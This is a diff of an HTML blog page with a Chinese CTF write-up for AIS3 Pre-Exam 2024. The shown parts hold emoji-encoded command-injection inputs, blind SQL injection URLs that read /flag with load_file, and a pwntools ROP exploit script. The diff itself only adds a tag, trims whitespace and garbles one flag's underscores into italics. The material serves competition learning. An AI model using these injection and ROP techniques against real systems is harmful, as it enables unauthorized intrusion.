@@ -52,6 +52,7 @@ Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic inte
     <meta property="article:published_time" content="2024-06-11T00:00:00+08:00">
     <meta property="article:modified_time" content="2024-06-11T00:00:00+08:00">
     <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Security">
  
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="【CTF-WriteUp】AIS3 Pre-Exam 2024">
@@ -311,6 +312,9 @@ Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic inte
             
             
             <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/security" rel="tag">security</a>
             
         </div>
         
@@ -620,8 +624,8 @@ M107
 <h4 id="flag-2">FLAG:</h4>
 <p>AIS3{b4d1y_tun3d_PriN73r}</p>
 <h3 id="emoji-console">Emoji Console</h3>
-<pre tabindex="0"><code>🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️ 
-Connection info: http://chals1.ais3.org:5000 
+<pre tabindex="0"><code>🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️
+Connection info: http://chals1.ais3.org:5000
 Author: TriangleSnake
 </code></pre><p>使用 <code>🐱 ⭐</code> 可以看到 Source Code 以及 emoji 代表的文字，並發現 flag 是一個目錄，沒辦法直接 cat flag</p>
 <p>接著我試了 <code>💿 🚩😜ℹ️🅿️ ⭐</code> 可以發現 flag 裡有個 <code>flag-printer.py</code></p>
@@ -633,8 +637,8 @@ Author: TriangleSnake
 <p>AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p>
 <h2 id="web">Web</h2>
 <h3 id="evil-calculator">Evil Calculator</h3>
-<pre tabindex="0"><code>This is a calculator written in Python. It&#39;s a simple calculator, but some function in it is VERY EVIL!! 
-Connection info: http://chals1.ais3.org:5001 
+<pre tabindex="0"><code>This is a calculator written in Python. It&#39;s a simple calculator, but some function in it is VERY EVIL!!
+Connection info: http://chals1.ais3.org:5001
 Author: TriangleSnake
 </code></pre><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -965,7 +969,7 @@ http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/
 http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/flag&#39;) limit 0,1),1,1)) &gt; 81
 ...
 </code></pre><p>以此類推得到結果為：</p>
-<pre tabindex="0"><code>&#34;AIS3{CRYCHIC_Funeral_&#34; + 
+<pre tabindex="0"><code>&#34;AIS3{CRYCHIC_Funeral_&#34; +
 240,159,152,173,
 240,159,142,184,
 240,159,152,173,
@@ -980,7 +984,7 @@ http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/
 </code></pre><p>這些超出 ASCII 範圍的數字可以到 <a href="https://www.utf8-chartable.de/unicode-utf8-table.pl">https://www.utf8-chartable.de/unicode-utf8-table.pl</a> 查表，四個數字為一組</p>
 <p>就可以得到最終 FLAG</p>
 <h4 id="flag-6">FLAG：</h4>
-<p>AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}</p>
+<p>AIS3{CRYCHIC<em>Funeral</em>😭🎸😭🎸😭🎤😭🥁😸🎸}</p>
 <h2 id="rev">Rev</h2>
 <h3 id="the-long-print">The Long Print</h3>
 <pre tabindex="0"><code>Welcome to The Long Print, a challenge where patience is not just a virtue—it&#39;s a requirement. But don&#39;t be fooled; waiting around won&#39;t get you the flag. This task requires your sharp reverse engineering skills to dive into the depths of an ELF binary, seemingly designed with all the time in the world in mind.
@@ -1064,7 +1068,7 @@ Author: Kazma
 </span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> remote(ip, port)
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>:
 </span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> process()
-</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;_|</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">__</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">___|_|</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
 </span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;q&#39;</span>) <span style="color:#6272a4"># 進 goodbye()</span>
@@ -1075,7 +1079,7 @@ Author: Kazma
 </span></span><span style="display:flex;"><span>win2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401997</span> <span style="color:#6272a4"># win 2 的 address</span>
 </span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x402540</span> <span style="color:#6272a4"># 找到的 Gadget 的 address</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> flat([<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> pad, pop_rdi,<span style="color:#bd93f9">0xDEADBEEF</span>,win1,pop_rdi,<span style="color:#bd93f9">0xCAFEBABE</span>,win2]) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> flat([<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> pad, pop_rdi,<span style="color:#bd93f9">0xDEADBEEF</span>,win1,pop_rdi,<span style="color:#bd93f9">0xCAFEBABE</span>,win2])
 </span></span><span style="display:flex;"><span><span style="color:#6272a4"># 兩個要檢查的數字是 0xDEADBEEF 跟 0xCAFEBABE，pop rdi 會把 rdi 設成 stack top 的值</span>
 </span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;[Y/n]&#39;</span>, payload);
 </span></span><span style="display:flex;"><span>
